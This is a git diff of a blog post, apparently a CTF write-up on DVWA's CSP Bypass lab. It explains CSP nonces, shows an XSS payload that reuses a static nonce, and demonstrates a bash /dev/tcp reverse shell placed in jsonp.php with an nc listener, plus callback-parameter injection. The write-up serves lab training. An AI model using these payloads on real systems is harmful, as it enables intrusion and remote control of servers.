@@ -2,13 +2,10 @@
 title: DVWA - CSP Bypass
 date: 2023-12-18
 categories: [CTF, Web Exploitation]
-tags: [dvwa, csp, csp-bypass]
+tags: [dvwa, csp, csp-bypass, burp, xss, javascript, js, php, nonce]
 img_path: /assets/dvwa/csp_bypass
 published: true
 ---
-
-> This task has an active issue: [CSP Bypass can't be solved with Hastebin anymore (once again) #539](https://github.com/digininja/DVWA/issues/539)
-{: .prompt-warning}
 
 ## Information
 
@@ -41,25 +38,119 @@ CSP is used to **define where scripts and other resources can be loaded or execu
 ## Security: Low
 > _Examine the policy to find all the sources that can be used to host external script files ([Source code](https://github.com/CSpanias/cspanias.github.io/blob/main/assets/dvwa/csp_bypass/csp_bypass_low_source.php))._
 
-1. If we take a look at the source code, we will find a whitelist of sources that we can use to achieve our objective:
-
-    ```php
-    $headerCSP = "Content-Security-Policy: script-src 'self' https://pastebin.com hastebin.com www.toptal.com example.com code.jquery.com https://ssl.google-analytics.com ;"; // allows js from self, pastebin.com, hastebin.com, jquery and google analytics.
-
-    header($headerCSP);
-    
-    # These might work if you can't create your own for some reason
-    # https://pastebin.com/raw/R570EE00
-    # https://www.toptal.com/developers/hastebin/raw/cezaruzek
-    ```
+> This task has an active issue: [CSP Bypass can't be solved with Hastebin anymore (once again) #539](https://github.com/digininja/DVWA/issues/539)
+{: .prompt-warning}
 
 ## Security: Medium
 > _The CSP policy tries to use a nonce to prevent inline scripts from being added by attackers ([Source code](https://github.com/CSpanias/cspanias.github.io/blob/main/assets/dvwa/csp_bypass/csp_bypass_medium_source.php))._
 
+1. If we have a look at the source code, we will see that a `nonce` has been included:
+
+    ```php
+    $headerCSP = "Content-Security-Policy: script-src 'self' 'unsafe-inline' 'nonce-TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=';";
+
+    header($headerCSP);
+
+    // Disable XSS protections so that inline alert boxes will work
+    header ("X-XSS-Protection: 0");
+
+    # <script nonce="TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=">alert(1)</script>
+    ```
+
+    Let's find out what exactly [`nonce`](https://blog.mozilla.org/security/2014/10/04/csp-for-the-web-we-have/) is:
+
+    _A CSP with a nonce-source might look like this:_
+
+    `content-security-policy: default-src 'self'; script-src 'nonce-2726c7f26c'`
+
+    And the corresponding document might contain a script element that looks like this:
+
+    ```php
+    <script nonce="2726c7f26c">
+    alert(123);
+    </script>
+    ```
+
+    There are 2 things to note here:
+    1. It’s important that the nonce changes for each response.
+    2. It’s important that the nonce is sufficiently hard to predict.
+
+    _Now, because the nonce changes in a way that isn’t predictable, **the attacker doesn’t know what to inject** and so, by only allowing script (or style) elements with valid nonce attributes, we can be sure that injections will fail._
+
+2. Essentialy, in order to bypass CSP we now need to know the `nonce`'s value. If we try to XSS as usual, it won't work:
+
+    ```javascript
+    <script>alert("XSS")</script>
+    ```
+
+    ![](medium_xss_fail.png)
+
+3. But if we pass our payload along with the `nonce`'s value, it will work just fine:
+
+    ```javascript
+    <script nonce="TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=">alert("XSS")</script>
+    ```
+
+    ![](medium_xss_nonce.png)
 
 ## Security: High
 > _The page makes a JSONP call to source/jsonp.php passing the name of the function to callback to, you need to modify the jsonp.php script to change the callback function ([Source code](https://github.com/CSpanias/cspanias.github.io/blob/main/assets/dvwa/csp_bypass/csp_bypass_high_source.php))._
 
+## Reverse shell
+
+1. On this level the pages makes a call to `jsonp.php` and executes whatever code is there:
+
+    ![](homg_high.png)
+
+    ```shell
+    $ cat /usr/share/dvwa/vulnerabilities/csp/source/jsonp.php
+    <?php
+    header("Content-Type: application/json; charset=UTF-8");
+
+    if (array_key_exists ("callback", $_GET)) {
+            $callback = $_GET['callback'];
+    } else {
+            return "";
+    }
+
+    $outp = array ("answer" => "15");
+
+    echo $callback . "(".json_encode($outp).")";
+    ?>
+    ```
+
+2. We can make a backup of this file and replace it with one that contains our code in it, such as a [php reveshe shell](https://highon.coffee/blog/reverse-shell-cheat-sheet/#php-reverse-shell):
+
+    ```shell
+    $ sudo cp jsonp.php jsonp.php.bak
+
+    $ ls
+    high.js  high.php  impossible.js  impossible.php  jsonp_impossible.php  jsonp.php  jsonp.php.bak  low.php  medium.php
+
+    $ cat jsonp.php
+    <?php exec("/bin/bash -c 'bash -i >& /dev/tcp/127.0.0.1/1337 0>&1'");?>
+    ```
+
+3. If we set up a listener and click the *Solve the sum* button, we should be able to catch the reverse shell:
+
+    ```shell
+    $  nc -lvnp 1337
+    listening on [any] 1337 ...
+    ```
+
+    ![](medium_revshell.png)
+
+## Command execution
+
+1. If we click the *Solve the sum* button and intercept the traffic with Burp, we will notice the `callback` parameter:
+
+    ![](high_burp.png)
+
+2. We can modify `callback`'s value by passing a simple payload and then execute our payload by sending the request:
+
+    ![](high_burp2.png)
+
+    ![](high_alert.png)
 
 ## Security: Impossible
 > _This level is an update of the high level where the JSONP call has its callback function hardcoded and the CSP policy is locked down to only allow external scripts ([Source code](https://github.com/CSpanias/cspanias.github.io/blob/main/assets/dvwa/csp_bypass/csp_bypass_impossible_source.php))._
